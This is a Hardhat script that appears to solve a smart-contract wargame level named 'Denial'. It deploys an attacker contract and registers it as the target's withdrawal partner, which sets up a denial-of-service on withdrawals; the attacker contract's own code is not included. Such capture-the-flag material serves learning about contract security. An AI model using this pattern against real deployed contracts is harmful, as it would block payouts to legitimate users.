const { expect } = require("chai")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let partner, tx, res, slot
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x4a251E146Bad378067e274af090d4054444C4db1"
    let target = await ethers.getContractAt("Denial", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "DenialAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    tx = await target.setWithdrawPartner(attackerContract.address)
    await tx.wait(1)

    // Check
    partner = await target.partner()
    if (partner == attackerContract.address) {
        console.log(
            `${symbols.success} Set partner Contract! Try submitting now`
        )
    } else {
        console.log(`${symbols.error} Partner not set yet!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
